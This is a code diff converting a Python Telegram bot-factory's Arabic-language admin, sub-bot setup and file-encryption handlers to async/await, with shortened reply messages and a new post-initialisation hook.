             bot_user_states[current_bot_username][user_id] = None
             return
 
@@ -1783,11 +1608,11 @@ def handle_message_made_bot(update: Update, context: CallbackContext):
                 if ban_id not in bot_settings["banned_users"]:
                     bot_settings["banned_users"].append(ban_id)
                     save_made_bot_settings(current_bot_username)
-                    send_message(context.bot, chat_id, f"✅ تم حظر {ban_id}.")
+                    await send_msg(context.bot, chat_id, f"تم حظر {ban_id}.")
                 else:
-                    send_message(context.bot, chat_id, "ℹ️ محظور بالفعل.")
+                    await send_msg(context.bot, chat_id, "محظور بالفعل.")
             except ValueError:
-                send_message(context.bot, chat_id, "❌ أرسل معرف صحيح.")
+                await send_msg(context.bot, chat_id, "أرسل معرف صحيح.")
             bot_user_states[current_bot_username][user_id] = None
             return
 
@@ -1797,11 +1622,11 @@ def handle_message_made_bot(update: Update, context: CallbackContext):
                 if unban_id in bot_settings["banned_users"]:
                     bot_settings["banned_users"].remove(unban_id)
                     save_made_bot_settings(current_bot_username)
-                    send_message(context.bot, chat_id, f"✅ تم إلغاء حظر {unban_id}.")
+                    await send_msg(context.bot, chat_id, f"تم إلغاء حظر {unban_id}.")
                 else:
-                    send_message(context.bot, chat_id, "ℹ️ غير محظور.")
+                    await send_msg(context.bot, chat_id, "غير محظور.")
             except ValueError:
-                send_message(context.bot, chat_id, "❌ أرسل معرف صحيح.")
+                await send_msg(context.bot, chat_id, "أرسل معرف صحيح.")
             bot_user_states[current_bot_username][user_id] = None
             return
 
@@ -1811,11 +1636,11 @@ def handle_message_made_bot(update: Update, context: CallbackContext):
                 if paid_id not in bot_settings["paid_users"]:
                     bot_settings["paid_users"].append(paid_id)
                     save_made_bot_settings(current_bot_username)
-                    send_message(context.bot, chat_id, f"✅ تم إضافة {paid_id} كمدفوع.")
+                    await send_msg(context.bot, chat_id, f"تم إضافة {paid_id} كمدفوع.")
                 else:
-                    send_message(context.bot, chat_id, "ℹ️ مدفوع بالفعل.")
+                    await send_msg(context.bot, chat_id, "مدفوع بالفعل.")
             except ValueError:
-                send_message(context.bot, chat_id, "❌ أرسل معرف صحيح.")
+                await send_msg(context.bot, chat_id, "أرسل معرف صحيح.")
             bot_user_states[current_bot_username][user_id] = None
             return
 
@@ -1825,11 +1650,11 @@ def handle_message_made_bot(update: Update, context: CallbackContext):
                 if remove_id in bot_settings["paid_users"]:
                     bot_settings["paid_users"].remove(remove_id)
                     save_made_bot_settings(current_bot_username)
-                    send_message(context.bot, chat_id, f"✅ تم إزالة {remove_id}.")
+                    await send_msg(context.bot, chat_id, f"تم إزالة {remove_id}.")
                 else:
-                    send_message(context.bot, chat_id, "ℹ️ ليس مدفوعاً.")
+                    await send_msg(context.bot, chat_id, "ليس مدفوعاً.")
             except ValueError:
-                send_message(context.bot, chat_id, "❌ أرسل معرف صحيح.")
+                await send_msg(context.bot, chat_id, "أرسل معرف صحيح.")
             bot_user_states[current_bot_username][user_id] = None
             return
 
@@ -1838,55 +1663,53 @@ def handle_message_made_bot(update: Update, context: CallbackContext):
                 points = int(text)
                 bot_settings["payload_points_required"] = points
                 save_made_bot_settings(current_bot_username)
-                send_message(context.bot, chat_id, f"✅ تم تعيين النقاط إلى {points}.")
+                await send_msg(context.bot, chat_id, f"تم تعيين النقاط إلى {points}.")
             except ValueError:
-                send_message(context.bot, chat_id, "❌ أرسل رقم صحيح.")
+                await send_msg(context.bot, chat_id, "أرسل رقم صحيح.")
             bot_user_states[current_bot_username][user_id] = None
             return
 
         if isinstance(state, dict) and state.get("action") == "await_channel_name_for_link":
             bot_settings["main_channel_link"] = text
             save_made_bot_settings(current_bot_username)
-            send_message(context.bot, chat_id, "✅ تم تعيين القناة الأساسية.")
+            await send_msg(context.bot, chat_id, "تم تعيين القناة الأساسية.")
             bot_user_states[current_bot_username][user_id] = None
             return
 
         if isinstance(state, dict) and state.get("action") == "await_custom_button_name":
             bot_user_states[current_bot_username][user_id] = {"action": "await_custom_button_value", "button_name": text}
-            send_message(context.bot, chat_id, "📝 أرسل رابط الزر أو نص الرسالة:")
+            await send_msg(context.bot, chat_id, "أرسل رابط الزر:")
             return
 
         if isinstance(state, dict) and state.get("action") == "await_custom_button_value":
             button_name = state.get("button_name")
-            new_button = {"name": button_name, "type": "internal_link", "value": text}
-            bot_settings["custom_buttons"].append(new_button)
+            bot_settings["custom_buttons"].append({"name": button_name, "type": "internal_link", "value": text})
             save_made_bot_settings(current_bot_username)
-            send_message(context.bot, chat_id, f"✅ تم إضافة الزر '{button_name}'.")
+            await send_msg(context.bot, chat_id, f"تم إضافة الزر '{button_name}'.")
             bot_user_states[current_bot_username][user_id] = None
             return
 
         if isinstance(state, dict) and state.get("action") == "await_token_sub_bot":
-            send_message(context.bot, chat_id, "⏳ جاري إعداد البوت الفرعي...")
+            await send_msg(context.bot, chat_id, "جاري إعداد البوت الفرعي...")
             sub_bot_token = text
             sub_bot_type = state["bot_type"]
             try:
                 bot_info_resp = requests.get(f"https://api.telegram.org/bot{sub_bot_token}/getMe").json()
                 if not bot_info_resp.get("ok"):
-                    send_message(context.bot, chat_id, "❌ التوكن غير صالح.")
+                    await send_msg(context.bot, chat_id, "التوكن غير صالح.")
                     bot_user_states[current_bot_username][user_id] = None
                     return
                 sub_bot_username = bot_info_resp["result"]["username"]
                 bots = created_bots.get(user_id, [])
                 bots.append({"token": sub_bot_token, "admin_id": user_id, "username": sub_bot_username, "bot_type": sub_bot_type})
                 created_bots[user_id] = bots
-                bot_data_file = os.path.join(DATABASE_DIR, f"{sub_bot_username}.json")
-                with open(bot_data_file, 'w') as f:
+                with open(os.path.join(DATABASE_DIR, f"{sub_bot_username}.json"), 'w') as f:
                     json.dump({"token": sub_bot_token, "admin_id": user_id, "bot_type": sub_bot_type}, f)
-                send_message(context.bot, chat_id, f"✅ تم تشغيل @{sub_bot_username}!")
+                await send_msg(context.bot, chat_id, f"تم تشغيل @{sub_bot_username}!")
                 threading.Thread(target=run_made_bot, args=(sub_bot_token, user_id, sub_bot_username, sub_bot_type), daemon=True).start()
             except Exception as e:
-                logging.error(f"Error setting up sub bot: {e}")
-                send_message(context.bot, chat_id, "❌ حدث خطأ.")
+                logging.error(f"Error: {e}")
+                await send_msg(context.bot, chat_id, "حدث خطأ.")
             bot_user_states[current_bot_username][user_id] = None
             return
 
@@ -1895,7 +1718,7 @@ def handle_message_made_bot(update: Update, context: CallbackContext):
 # handle_document_made_bot
 # =============================================
 
-def handle_document_made_bot(update: Update, context: CallbackContext):
+async def handle_document_made_bot(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
     chat_id = update.effective_chat.id
     current_bot_token = context.bot.token
@@ -1903,8 +1726,7 @@ def handle_document_made_bot(update: Update, context: CallbackContext):
     if not current_bot_username:
         return
 
-    bot_type = get_bot_type(current_bot_username)
-    if bot_type != "encryption_bot":
+    if get_bot_type(current_bot_username) != "encryption_bot":
         return
 
     if current_bot_username not in bot_user_states:
@@ -1921,8 +1743,8 @@ def handle_document_made_bot(update: Update, context: CallbackContext):
 
     if action in ["await_file_for_encryption", "await_file_for_decryption"]:
         try:
-            file = update.message.document.get_file()
-            file_bytes = file.download_as_bytearray()
+            file = await update.message.document.get_file()
+            file_bytes = await file.download_as_bytearray()
             if action == "await_file_for_encryption":
                 result = encrypt_data(file_bytes, enc_type)
             else:
@@ -1931,12 +1753,12 @@ def handle_document_made_bot(update: Update, context: CallbackContext):
             with open(result_path, 'wb') as f:
                 f.write(result)
             with open(result_path, 'rb') as f:
-                context.bot.send_document(chat_id=chat_id, document=f)
+                await context.bot.send_document(chat_id=chat_id, document=f)
             os.remove(result_path)
-            send_message(context.bot, chat_id, "✅ تمت العملية بنجاح!")
+            await send_msg(context.bot, chat_id, "تمت العملية بنجاح!")
         except Exception as e:
-            logging.error(f"Error processing document: {e}")
-            send_message(context.bot, chat_id, "❌ حدث خطأ أثناء معالجة الملف.")
+            logging.error(f"Error: {e}")
+            await send_msg(context.bot, chat_id, "حدث خطأ.")
         bot_user_states[current_bot_username][user_id] = None
 
 
@@ -1944,8 +1766,13 @@ def handle_document_made_bot(update: Update, context: CallbackContext):
 # نقطة التشغيل الرئيسية
 # =============================================
 
+async def post_init(application):
+    """دالة يتم استدعاؤها بعد تهيئة التطبيق."""
+    logging.info("Application initialized successfully")
+
+
 def main():
-    app = ApplicationBuilder().token(MAIN_BOT_TOKEN).build()
+    app = ApplicationBuilder().token(MAIN_BOT_TOKEN).post_init(post_init).build()
 
     app.add_handler(CommandHandler("start", start_main_bot))
     app.add_handler(CallbackQueryHandler(create_bot_main_bot, pattern="^create_bot$"))
@@ -1961,11 +1788,10 @@ def main():
     app.add_handler(CallbackQueryHandler(stop_all_bots_main_bot, pattern="^stop_all_bots$"))
     app.add_handler(CallbackQueryHandler(start_all_bots_main_bot, pattern="^start_all_bots$"))
     app.add_handler(CallbackQueryHandler(broadcast_free_bots_main_bot, pattern="^broadcast_free_bots$"))
-    app.add_handler(CallbackQueryHandler(add_factory_main_subscription, pattern="^add_factory_main_subscription$"))
-    app.add_handler(CallbackQueryHandler(remove_factory_main_subscription, pattern="^remove_factory_main_subscription$"))
+    app.add_handler(CallbackQueryHandler(add_factory_main_subscription, pattern="^add_factory_main_sub$"))
+    app.add_handler(CallbackQueryHandler(remove_factory_main_subscription, pattern="^remove_factory_main_sub$"))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message_main_bot))
 
-    # تشغيل البوتات المصنوعة المحفوظة
     if os.path.exists(DATABASE_DIR):
         for filename in os.listdir(DATABASE_DIR):
             if filename.endswith(".json") and not filename.endswith("_settings.json"):
